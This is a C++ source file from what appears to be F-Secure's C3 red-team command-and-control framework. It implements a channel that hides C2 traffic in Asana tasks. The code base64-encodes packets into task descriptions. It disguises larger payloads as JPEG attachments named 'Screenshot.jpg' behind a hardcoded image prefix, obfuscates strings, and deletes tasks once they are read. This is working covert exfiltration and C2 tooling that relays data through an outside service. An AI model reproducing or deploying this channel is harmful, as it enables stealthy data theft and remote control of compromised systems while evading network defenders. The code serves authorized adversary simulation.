#include "Stdafx.h"
#include "Asana.h"
#include "Common/FSecure/Crypto/Base64.h"

FSecure::C3::Interfaces::Channels::Asana::Asana(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [token, projectId] = arguments.Read<std::string, std::string>();
	m_asanaObj = FSecure::AsanaApi{ token, projectId, m_inboundDirectionName, m_outboundDirectionName };
	// This is the base64 of the image you'd like to prepend to all Asana attachments
	std::string attachmentPrefixBase64 = OBF("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");
	m_attachmentPrefix = cppcodec::base64_rfc4648::decode(attachmentPrefixBase64);
}

size_t FSecure::C3::Interfaces::Channels::Asana::OnSendToChannel(ByteView data)
{
	std::string taskName = OBF("Task") + std::to_string(FSecure::Utils::GenerateRandomValue<int>(10000, 99999)); // random task name
	// Asana's task descriptions can't exceed 65 535 characters. If the packet is bigger than this treshold, we upload an attachment instead.
	if (data.size() < cppcodec::base64_rfc4648::decoded_max_size(65'535)) {
		// Data size is smaller than treshold, proceeding by adding data to the Description field of the task.
		m_asanaObj.CreateTask(taskName, cppcodec::base64_rfc4648::encode(data.data(), data.size()));
		return data.size();
	} else {
		// Data size is larger than treshold, proceeding by putting data in the task's attachment
		std::string attachmentName = OBF("Screenshot.jpg"); // inconspicuous attachment name
		// Make sure we're not sending more than 100MB in attachment (this check is probably overly cautious)
		size_t maxMessageSize = 104'857'600 - m_attachmentPrefix.size();
		size_t actualPacketSize = std::min(maxMessageSize, data.size());
		ByteVector sendData = data.SubString(0, actualPacketSize);
		// Prepend the prefix to the payload
		sendData.insert(sendData.begin(), m_attachmentPrefix.begin(), m_attachmentPrefix.end());
		// We have to move the data into an actual vector<uint8_t> because ByteVector only privately inherits from vector<uint8_t>..
		std::vector<uint8_t> tmp; 
		tmp.insert(tmp.begin(), std::make_move_iterator(sendData.begin()), std::make_move_iterator(sendData.end()));
		// Create the task
		m_asanaObj.CreateTaskWithAttachment(taskName, tmp, attachmentName, OBF("image/jpeg"));
		return actualPacketSize;
	}
	
}

std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Asana::OnReceiveFromChannel()
{
	std::vector<std::tuple<std::string, std::string, std::vector<uint8_t>, bool>> tasks = m_asanaObj.GetTasks();
	// Sort tasks by creation time
	std::sort(tasks.begin(), tasks.end(), [](auto const& a, auto const& b) -> bool { return std::get<1>(a) < std::get<1>(b); });
	// Get packets from tasks
	std::vector<ByteVector> ret;
	std::vector<std::string> tasksToDelete;
	for (auto& t : tasks) {
		std::string taskId = std::get<0>(t);
		std::vector<uint8_t> unprocessedTaskBody = std::get<2>(t);
		ByteVector taskBodyByteVector;
		if (std::get<3>(t)) { // If the body came from the attachments, we need to delete the prefix we added in OnSendToChannel.
			std::vector<uint8_t> contentWithoutPrefix(std::make_move_iterator(unprocessedTaskBody.begin() + m_attachmentPrefix.size()), std::make_move_iterator(unprocessedTaskBody.end()));
			taskBodyByteVector = ByteVector(contentWithoutPrefix);
		} else { // If the body came from the description, we need to base64 decode it.
			taskBodyByteVector = ByteVector(cppcodec::base64_rfc4648::decode(unprocessedTaskBody));
		}
		ret.emplace_back(taskBodyByteVector);
		tasksToDelete.push_back(std::move(taskId));
	}
	// Delete processed tasks
	for (auto& taskId : tasksToDelete) {
		m_asanaObj.DeleteTask(taskId);
	}
	return ret;
}

const char* FSecure::C3::Interfaces::Channels::Asana::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Asana Personal Access Token",
				"min": 1,
				"description": "This token is what channel needs to interact with Asana's API"
			},
			{
				"type": "string",
				"name": "Project ID",
				"min": 1,
				"description": "The Project ID of the Asana project"
			}
		]
	},
	"commands": []
}
)_";
}
